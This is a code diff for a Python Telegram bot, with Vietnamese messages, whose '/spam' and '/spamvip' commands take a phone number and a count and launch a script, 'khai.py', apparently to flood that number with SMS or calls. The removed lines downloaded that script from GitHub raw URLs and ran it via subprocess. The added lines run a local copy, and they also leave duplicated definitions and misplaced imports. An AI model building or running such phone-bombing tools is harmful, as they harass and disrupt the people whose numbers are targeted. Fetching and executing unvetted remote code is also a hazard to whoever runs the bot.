@@ -225,24 +225,24 @@ def diggory(message):
     '''
     bot.send_message(message.chat.id, diggory_chat)
 
-
 last_usage = {}
+blacklist = set()
 
 @bot.message_handler(commands=['spam'])
 def spam(message):
     user_id = message.from_user.id
-    
     current_time = time.time()
+
     if user_id in last_usage and current_time - last_usage[user_id] < 100:
         bot.reply_to(message, f"Vui lòng đợi {100 - (current_time - last_usage[user_id]):.1f} giây trước khi sử dụng lệnh lại.")
         return
-    
+
     last_usage[user_id] = current_time
 
     params = message.text.split()[1:]
 
     if len(params) < 2:
-        bot.reply_to(message, "/spam 113 5 như này cơ mà - vì lý sever treo bot hơi cùi nên đợi 100giây nữa dùng lại nhé")
+        bot.reply_to(message, "/spam 113 5 như này cơ mà - vì lý server treo bot hơi cùi nên đợi 100giây nữa dùng lại nhé")
         return
 
     sdt = params[0]
@@ -251,9 +251,9 @@ def spam(message):
     if not count.isdigit():
         bot.reply_to(message, "Số lần spam không hợp lệ. Vui lòng chỉ nhập số.")
         return
-    
+
     count = int(count)
-    
+
     if count > 5:
         bot.reply_to(message, "/spam sdt 5 thôi nhé - đợi 100giây sử dụng lại.")
         return
@@ -272,21 +272,37 @@ def spam(message):
 └─────────────
     '''
 
-    script_url = "https://raw.githubusercontent.com/luvanlong01122007/luvanlong01122007/main/khai.py"
+    script_filename = "khai.py"  # Tên file Python trong cùng thư mục
     try:
-        response = requests.get(script_url)
-        if response.status_code == 200:
-            with tempfile.NamedTemporaryFile(delete=False) as temp_file:
-                temp_file.write(response.content)
-                temp_file_path = temp_file.name
-            process = subprocess.Popen(["python", temp_file_path, sdt, str(count)])
-            bot.send_message(message.chat.id, diggory_chat3)
-        else:
-            bot.reply_to(message, f"Lỗi Rồi Chạy Lại Đê")
+        # Kiểm tra xem file có tồn tại không
+        if not os.path.isfile(script_filename):
+            bot.reply_to(message, "Không tìm thấy file script. Vui lòng kiểm tra lại.")
+            return
+
+        # Đọc nội dung file
+        with open(script_filename, 'r') as file:
+            script_content = file.read()
+
+        # Tạo file tạm thời
+        with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as temp_file:
+            temp_file.write(script_content.encode())
+            temp_file_path = temp_file.name
+
+        # Chạy file tạm thời
+        process = subprocess.Popen(["python", temp_file_path, sdt, str(count)])
+        bot.send_message(message.chat.id, diggory_chat3)
     except Exception as e:
-        bot.reply_to(message, f"Lỗi Tí Rồi Chạy Lại Đê")
+        bot.reply_to(message, f"Lỗi xảy ra: {str(e)}")
+
+import time
+import subprocess
+import tempfile
+import os
 
 blacklist = ["112", "113", "114", "115", "116", "117", "118", "119", "0", "1", "2", "3", "4", "5"]
+last_usage = {}
+
+
 @bot.message_handler(commands=['spamvip'])
 def supersms(message):
     user_id = message.from_user.id
@@ -334,22 +350,15 @@ def supersms(message):
 └─────────────
     '''
 
-    script_url = "https://raw.githubusercontent.com/anhnhhhhhh/anhnhhhhhh/main/khai.py"
-    try:
-        response = requests.get(script_url)
-        if response.status_code == 200:
-            with tempfile.NamedTemporaryFile(delete=False) as temp_file:
-                temp_file.write(response.content)
-                temp_file_path = temp_file.name
-            process = subprocess.Popen(["python", temp_file_path, sdt, str(count)])
+    script_path = "khai.py"  # Đảm bảo rằng tập tin khai.py nằm trong cùng thư mục với mã nguồn của bạn
+    if os.path.isfile(script_path):
+        try:
+            process = subprocess.Popen(["python", script_path, sdt, str(count)])
             bot.send_message(message.chat.id, diggory_chat3)
-        else:
-            bot.reply_to(message, f"Lỗi Rồi Chạy Lại Đi")
-    except Exception as e:
-        bot.reply_to(message, f"Lỗi Rồi Chạy Lại Đi")
-
-
-
+        except Exception as e:
+            bot.reply_to(message, f"Lỗi Rồi Chạy Lại Đi: {str(e)}")
+    else:
+        bot.reply_to(message, "Tập tin script không tìm thấy.")
 
 
 
